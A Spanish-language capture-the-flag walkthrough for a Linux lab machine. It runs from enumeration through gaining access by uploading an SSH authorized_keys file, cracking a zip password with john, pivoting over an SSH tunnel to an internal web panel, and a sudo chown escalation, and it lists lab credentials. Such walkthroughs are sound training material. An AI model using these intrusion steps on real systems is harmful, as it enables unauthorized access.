## Reconocimiento:

ttl = 64 (Linux) con una microsoft-ds:445, Samba:139/:445 y http:80

feroxbuster y hay un readme.txt; Y un upload.php que a lo mejor sirve

```bash
$ feroxbuster -u http://IP -w /usr/share/dirbuster/wordlists/
directory-list-lowercase-2.3-medium.txt -t 50 -d 10 -x php,back,
backup,txt,sh,html,js,java,py
enum4linux IP 
```


usuarios enlistados (Pide contraseña) ( users : root-false,sambauser,less,passsamba ). Pero hay un directorio compartido “read_only_share” 

Leyendo en readme hay un mensaje con la palabra clave .ssh/ indicando un rep. Dando a entender que se puede subir un id_rsa.pub y authorized_keys (Clave publica).

Crear calve publica:

```bash
$ ssh-keygen -t rrsa -b 4096
$ cp ~/.ssh/id_rsa.pub .
$ cat id_rsa.pub > authorized_keys
```

Se suben a la pagina  

Se usa para entrar con usuarios de Samba (Deja con usuario: passsamba )

```bash
$ ssh -i ~/.ssh/id_rsa
```

## Escalada sambauser → root-false

Hay una nota con una contraseña para ftp. Recordando los usuarios deja con sambauser.

Deciframos la contraseña del .zip

```bash
$ zip2john secret.zip > hash.txt
$ john --format=PKZIP -w /usr/share/wordlists/rockyou.txt hash.txt
```

Contraseña : qwert

Encontramos una contraseña para el usuario root-false encodeada en Base64

Hay un txt interesante pero no se puede hacer mucho

## Escalada root-false → less

ip a y hay otra IP interna

Carpeta /etc/apache2

Buscar puerto para tunelizar con:

```bash
$ ls -trola /etc/apache2/sites-enabled
$ cat /etc/apache2/sites-enabled/second-site.conf
```

y en otra teminal tunelizar el puerto 80 de la IP secundaria sabiendo que se aloja en el puerto 80:

```bash
$ ssh -L 8080:10.10.11.5:80 root-false@<IP>

En la maquina host:

http://localhost:8080
```

Hay un panel de login que con la contraseña ( mario:pinguinodemarioelmejor ) 

En el código de la pagina viene “ultramegasecreto.txt”, es un directorio con archivo txt y contrseña oculta

Script En python para hacerlo cortesía de Dise0:

```python
import re
texto = """ """
texto = re.sub(r'[^\w\s_]', '', texto)
palabras = texto.split()
palabras_unicas = set(palabras)
for palabra in sorted(palabras_unicas):
		print(palabra)
```

sudo -l y es vulnerable el binario chown y lo explotamos
